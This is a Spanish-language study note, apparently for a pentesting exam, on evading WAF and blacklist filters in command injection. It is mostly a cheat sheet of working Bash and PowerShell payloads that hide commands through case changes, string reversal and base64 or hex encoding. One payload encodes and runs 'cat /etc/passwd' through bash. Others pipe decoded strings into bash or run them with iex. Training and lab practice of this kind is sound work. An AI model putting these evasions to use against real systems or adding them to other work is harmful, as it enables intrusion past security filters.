---
tags:
  - webapp
  - bypass
  - RCE
  - commandinjection
---
## Conceptos Clave (TL;DR)

- Los WAFs y filtros de blacklist suelen comparar cadenas literales; manipular mayúsculas, invertir o codificar comandos rompe esa comparación sin alterar la ejecución real.
- Linux es case-sensitive, por lo que la manipulación de mayúsculas requiere un paso extra de normalización (tr o printf). Windows CMD/PowerShell son case-insensitive, por lo que basta con cambiar el casing directamente.
- La codificación en base64 o hex permite encapsular payloads completos (incluyendo caracteres filtrados como pipes, espacios o slashes) y decodificarlos en tiempo de ejecución dentro de una sub-shell.
- Cada técnica puede combinarse: si un carácter del método de bypass también está filtrado (ej. espacios en tr, pipes en base64), se sustituye por su equivalente permitido (tabs `%09`, here-string `<<<`).


## Herramientas Clave

| Herramienta / Built-in | Propósito en este vector                                                              |
| ---------------------- | ------------------------------------------------------------------------------------- |
| `tr`                   | Normalizar mayúsculas a minúsculas en bash para evadir blacklists case-sensitive      |
| `printf`               | Alternativa a `tr` para forzar lowercase de una variable                              |
| `rev`                  | Invertir una cadena para ofuscar el nombre del comando                                |
| `base64`               | Codificar/decodificar payloads completos que contienen caracteres filtrados           |
| `xxd`                  | Codificación/decodificación alternativa en hex                                        |
| `iconv`                | Convertir encoding UTF-8 a UTF-16LE (necesario para base64 compatible con PowerShell) |
| `bash<<<`              | Ejecutar string sin usar pipe `                                                       |
| `iex "$(...)"`         | Sub-shell de PowerShell para ejecutar strings decodificados                           |
| `openssl`              | Alternativa a `base64` si este binario está filtrado                                  |
| PayloadsAllTheThings   | Referencia externa con técnicas adicionales (wildcards, regex, integer expansion)     |


## Metodología Paso a Paso

### Fase 1: Identificar que caracteres y palabras estan filtrados

Antes de elegir una técnica, determina qué está siendo bloqueado:
- Palabras clave de comandos (`whoami`, `cat`, `bash`, etc.)
- Caracteres especiales (`|`, ` ` espacio, `/`, `<`, `>`)
- Si el filtro es case-sensitive o no (Linux vs Windows)

Esto define qué técnica aplicar y qué caracteres del propio bypass debes sustituir.

---

### Fase 2: Aplicar Case Manipulation

**Por que:** El blacklist compara la string literal. Cambiando el casing, la string no hace match pero el intérprete la ejecuta igual.

**Windows (CMD/PowerShell) - directo:**
El intérprete es case-insensitive; basta con enviar el comando con casing alterado.

**Linux/Bash - requiere normalización:**
Usar `tr` o `printf` para convertir el comando mezclado a minúsculas en runtime, dentro de una sub-shell `$()`.

---

### Fase 3: Aplicar Reversed Commands

**Por que:** El nombre del comando nunca aparece en texto claro en el payload; solo existe su forma invertida. El filtro no lo detecta porque busca la palabra exacta.

1. Calcular la cadena invertida del comando en tu terminal local.
2. Enviar la cadena invertida y revertirla en runtime con `rev<<<` (Linux) o indexación negativa (PowerShell).

---

### Fase 4: Aplicar Encoded Commands (Base64 / Hex)

**Por que:** Permite ofuscar un payload completo, incluyendo pipes, espacios y slashes, en una sola cadena alfanumérica que no triggerea filtros de caracteres.

1. Codificar el payload completo en local (base64 o xxd).
2. Construir el comando de decodificación + ejecución en una sub-shell, sustituyendo cualquier carácter filtrado del propio wrapper (ej. reemplazar espacios por `%09` o usar `<<<` en lugar de `|`).

**Nota Windows:** PowerShell usa Unicode (UTF-16LE) para base64. Usar `iconv` en Linux para generar el base64 compatible, o `[Convert]::ToBase64String` directamente en PowerShell.

---

### Fase 5: Encadenar tecnicas si es necesario

Si el binario del bypass (`bash`, `base64`) tambien esta filtrado:
- Sustituir `bash` por `sh`
- Sustituir `base64` por `openssl enc -d -base64` o `xxd -r -p`
- Aplicar character insertion o las tecnicas de la seccion anterior sobre el wrapper


## Cheat Sheet de Comandos

### Linux / Bash

```bash
# CASE MANIPULATION - tr
# tr reemplaza cada caracter de [A-Z] por su equivalente en [a-z]
# El comando mezclado se normaliza a minusculas en runtime dentro de $()
# Reemplazar espacios por %09 (tab) si el espacio esta filtrado
$(tr "[A-Z]" "[a-z]"<<<"<MIXED_CASE_CMD>")

# Ejemplo: ejecutar whoami con casing alternado
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
# CASE MANIPULATION - printf
# printf %s con expansion de parametro ,, fuerza lowercase de la variable
# No requiere herramienta externa, todo built-in de bash
$(a="<MIXED_CASE_CMD>";printf %s "${a,,}")

# Ejemplo:
$(a="WhOaMi";printf %s "${a,,}")
```

```bash
# REVERSED COMMANDS - paso 1: obtener la cadena invertida en local
# rev lee stdin y devuelve los caracteres en orden inverso
echo '<COMMAND>' | rev

# Ejemplo:
echo 'whoami' | rev
# Output: imaohw
```

```bash
# REVERSED COMMANDS - paso 2: ejecutar el comando invertido en runtime
# rev<<< invierte la cadena literal sin usar pipe (evasion de filtro de |)
# $() ejecuta el resultado como comando
$(rev<<<'<REVERSED_COMMAND>')

# Ejemplo:
$(rev<<<'imaohw')
```

```bash
# ENCODED COMMANDS (BASE64) - paso 1: codificar el payload en local
# -n evita que echo agregue newline al final, que corromperia el base64
echo -n '<FULL_PAYLOAD_WITH_FILTERED_CHARS>' | base64

# Ejemplo: payload con pipe y espacios
echo -n 'cat /etc/passwd | grep 33' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```bash
# ENCODED COMMANDS (BASE64) - paso 2: decodificar y ejecutar en el target
# bash<<< evita usar pipe | para pasar el output
# base64 -d<<< decodifica la cadena inline sin archivo temporal
# Reemplazar espacios del wrapper por %09 si estan filtrados
bash<<<$(base64 -d<<<'<BASE64_ENCODED_PAYLOAD>')

# Ejemplo:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

```bash
# ENCODED COMMANDS (BASE64 para PowerShell, generado desde Linux)
# iconv convierte la cadena de UTF-8 a UTF-16LE (little-endian)
# PowerShell espera Unicode (UTF-16LE) para sus strings base64
echo -n '<COMMAND>' | iconv -f utf-8 -t utf-16le | base64

# Ejemplo:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# Output: dwBoAG8AYQBtAGkA
```

```bash
# ALTERNATIVA si base64 esta filtrado: usar openssl para decodificar
echo '<BASE64_ENCODED_PAYLOAD>' | openssl enc -d -base64 | bash
```

```bash
# ALTERNATIVA si base64 esta filtrado: usar xxd para hex encoding
# Codificar en hex
echo -n '<COMMAND>' | xxd -p

# Decodificar y ejecutar
bash<<<$(xxd -r -p<<<'<HEX_ENCODED_PAYLOAD>')
```

---

### Windows / PowerShell

```powershell
# CASE MANIPULATION - directo (CMD y PowerShell son case-insensitive)
# Enviar el comando con cualquier combinacion de mayusculas/minusculas
<MiXeD_CaSe_CoMmAnD>

# Ejemplo:
WhOaMi
```

```powershell
# REVERSED COMMANDS - paso 1: obtener la cadena invertida en local
# [-1..-20] indexa el string de atras hacia adelante (hasta 20 chars)
# -join '' concatena el array de caracteres resultante en un string
"<COMMAND>"[-1..-20] -join ''

# Ejemplo:
"whoami"[-1..-20] -join ''
# Output: imaohw
```

```powershell
# REVERSED COMMANDS - paso 2: ejecutar en runtime
# iex "$(...)" es el equivalente a bash $() en PowerShell
# [-1..-20] revierte la cadena, -join '' la une, iex la ejecuta
iex "$('<REVERSED_COMMAND>'[-1..-20] -join '')"

# Ejemplo:
iex "$('imaohw'[-1..-20] -join '')"
```

```powershell
# ENCODED COMMANDS (BASE64) - paso 1: codificar en PowerShell
# [System.Text.Encoding]::Unicode.GetBytes convierte a UTF-16LE (bytes)
# [Convert]::ToBase64String convierte el array de bytes a base64
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<COMMAND>'))

# Ejemplo:
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA
```

```powershell
# ENCODED COMMANDS (BASE64) - paso 2: decodificar y ejecutar
# [System.Convert]::FromBase64String decodifica el base64 a bytes
# [System.Text.Encoding]::Unicode.GetString convierte bytes a string UTF-16LE
# iex "$(...)" ejecuta el string resultante
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64_ENCODED_PAYLOAD>')))"

# Ejemplo:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```


## "Gotchas" y Troubleshooting

- **El bypass en si puede contener caracteres filtrados:** Si el espacio esta filtrado, el comando `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` falla porque contiene espacios. Siempre revisar el wrapper con la misma lista de caracteres filtrados y sustituir antes de enviar (ej. espacio -> `%09`).

- **Linux es case-sensitive, Windows no:** En Linux no puedes simplemente escribir `WHOAMI`; necesitas la normalización via `tr` o `printf`. En Windows/PowerShell cualquier casing funciona sin pasos adicionales.

- **`|` (pipe) suele estar filtrado:** Usar `<<<` (here-string) como alternativa para pasar input a comandos sin pipe. Ejemplo: `bash<<<$(base64 -d<<<...)` en lugar de `echo ... | base64 -d | bash`.

- **PowerShell requiere UTF-16LE para base64:** Si generas el base64 en Linux con `echo -n 'cmd' | base64` (UTF-8) e intentas decodificarlo con `[System.Convert]::FromBase64String` en PowerShell, el resultado sera garbage. Usar `iconv -f utf-8 -t utf-16le` antes del `base64` en Linux.

- **Si `bash` o `base64` estan filtrados como palabras:** Sustituir `bash` por `sh`, `base64 -d` por `openssl enc -d -base64`, o usar encoding hex con `xxd -r -p`. Aplicar las tecnicas de character insertion sobre los binarios del wrapper si es necesario.

- **Las tecnicas de reversed/encoded no son magicas si la sub-shell esta bloqueada:** Si `$()` o `iex` estan bloqueados a nivel WAF, estas tecnicas no funcionaran. En ese caso escalar a otras tecnicas (wildcards, integer expansion, output redirection referenciadas en PayloadsAllTheThings).

- **Unicidad del payload de base64:** Cada payload codificado es unico para cada comando. No reutilizar base64 de writeups publicos; WAFs modernos pueden tener firmas de strings conocidos. Generar siempre el base64 en local para el comando especifico del ejercicio.

- **El modulo menciona tecnicas adicionales no cubiertas aqui:** wildcards, regex, output redirection, integer expansion. Consultar PayloadsAllTheThings como referencia rapida durante el examen si las tecnicas anteriores no son suficientes.